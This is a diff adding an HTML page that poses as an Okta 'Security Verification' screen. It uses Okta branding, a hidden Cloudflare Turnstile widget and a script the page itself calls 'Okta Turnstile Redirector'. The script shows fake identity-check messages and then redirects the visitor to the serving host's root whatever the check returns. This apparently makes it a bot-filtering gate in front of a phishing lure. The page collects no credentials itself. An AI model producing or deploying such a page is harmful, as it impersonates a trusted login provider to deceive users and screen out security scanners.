@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification - Okta</title>
+    <link rel="icon" href="https://ok1static.oktacdn.com/fs/bco/1/fs0a5gkj5hiMH2wjz0h7" type="image/x-icon">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+            background: #f9f9f9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #5e5e5e;
+        }
+
+        .container {
+            background: white;
+            padding: 48px 40px;
+            border-radius: 4px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.12);
+            text-align: center;
+            max-width: 480px;
+            width: 100%;
+        }
+
+        .okta-logo {
+            width: 140px;
+            margin-bottom: 32px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 16px;
+            color: #1d1d1d;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #5e5e5e;
+            margin-bottom: 32px;
+            line-height: 24px;
+        }
+
+        .security-info {
+            background: #f0f8ff;
+            border: 1px solid #007dc1;
+            padding: 20px;
+            margin-bottom: 28px;
+            text-align: left;
+            border-radius: 4px;
+        }
+
+        .security-info h2 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #007dc1;
+            display: flex;
+            align-items: center;
+        }
+
+        .security-info h2::before {
+            content: "🔒";
+            margin-right: 8px;
+        }
+
+        .security-info p {
+            font-size: 14px;
+            color: #5e5e5e;
+            line-height: 20px;
+            margin: 0;
+        }
+
+        .loading-container {
+            margin: 32px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e5e5e5;
+            border-top-color: #007dc1;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 14px;
+            color: #5e5e5e;
+        }
+
+        .footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e5e5e5;
+            font-size: 12px;
+            color: #5e5e5e;
+        }
+
+        .footer a {
+            color: #007dc1;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        #cf-turnstile {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 16px;
+                padding: 32px 24px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .subtitle {
+                font-size: 15px;
+            }
+        }
+    </style>
+    
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- Okta Logo -->
+        <svg class="okta-logo" viewBox="0 0 140 40" xmlns="http://www.w3.org/2000/svg">
+            <path d="M20 0C8.954 0 0 8.954 0 20s8.954 20 20 20 20-8.954 20-20S31.046 0 20 0zm0 30c-5.523 0-10-4.477-10-10s4.477-10 10-10 10 4.477 10 10-4.477 10-10 10z" fill="#007DC1"/>
+            <path d="M53 10h5.5v10.5L64 10h6.5L64 20.5 71 31h-6.5L59 21.5V31h-6V10zm25 0h6v11.5c0 3-1.5 4.5-4 4.5h-1v-5h.5c.8 0 1.5-.7 1.5-1.5V10zm-3.5 16h13v5h-13v-5zm22-16h6v11h7v5h-13V10zm15 0h13v5h-7v2h6v4h-6v3h7v5h-13V10z" fill="#5E5E5E"/>
+        </svg>
+        
+        <h1>Security Verification</h1>
+        
+        <div class="subtitle">
+            Additional authentication required to access your organization
+        </div>
+        
+        <div class="security-info">
+            <h2>Enterprise Security Check</h2>
+            <p>Your organization requires this verification step to ensure secure access to enterprise applications. This process validates your identity and device trustworthiness.</p>
+        </div>
+        
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-text">Verifying your identity...</div>
+        </div>
+        
+        <div id="cf-turnstile"></div>
+        
+        <div class="footer">
+            <a href="https://www.okta.com/privacy-policy/" target="_blank">Privacy Policy</a> • 
+            <a href="https://www.okta.com/terms-of-service/" target="_blank">Terms of Service</a> • 
+            <a href="https://support.okta.com/" target="_blank">Support</a>
+        </div>
+    </div>
+
+    <script>
+        const TURNSTILE_SITEKEY = '0x4AAAAAAB_V5zjG-p6Hl2ZQ';
+        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
+        
+        console.log('Okta Turnstile Redirector - Redirect URL:', REDIRECT_URL);
+        
+        function performRedirect() {
+            console.log('Performing redirect to:', REDIRECT_URL);
+            window.location.href = REDIRECT_URL;
+        }
+        
+        if (typeof turnstile === 'undefined') {
+            console.error('Turnstile failed to load. Redirecting anyway...');
+            document.querySelector('.status-text').textContent = 'Completing verification...';
+            setTimeout(performRedirect, 2000);
+        } else {
+            turnstile.ready(function () {
+                let verificationTimeout;
+                let verificationCompleted = false;
+                
+                verificationTimeout = setTimeout(function() {
+                    if (!verificationCompleted) {
+                        console.warn('Turnstile verification timeout - redirecting anyway');
+                        document.querySelector('.status-text').textContent = 'Completing verification...';
+                        setTimeout(performRedirect, 500);
+                    }
+                }, 5000);
+                
+                try {
+                    turnstile.render('#cf-turnstile', {
+                        sitekey: TURNSTILE_SITEKEY,
+                        callback: function(token) {
+                            verificationCompleted = true;
+                            clearTimeout(verificationTimeout);
+                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                            setTimeout(performRedirect, 800);
+                        },
+                        'error-callback': function(error) {
+                            verificationCompleted = true;
+                            clearTimeout(verificationTimeout);
+                            console.error('Turnstile error:', error);
+                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
+                            setTimeout(performRedirect, 1000);
+                        },
+                        'timeout-callback': function() {
+                            console.warn('Turnstile timeout');
+                            document.querySelector('.status-text').textContent = 'Verification timeout. Redirecting...';
+                            setTimeout(performRedirect, 1000);
+                        }
+                    });
+                } catch (e) {
+                    clearTimeout(verificationTimeout);
+                    console.error('Failed to render Turnstile:', e);
+                    setTimeout(performRedirect, 1500);
+                }
+            });
+        }
+        
+        setTimeout(function() {
+            if (REDIRECT_URL) {
+                console.log('3-second fallback redirect triggered');
+                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                performRedirect();
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
+
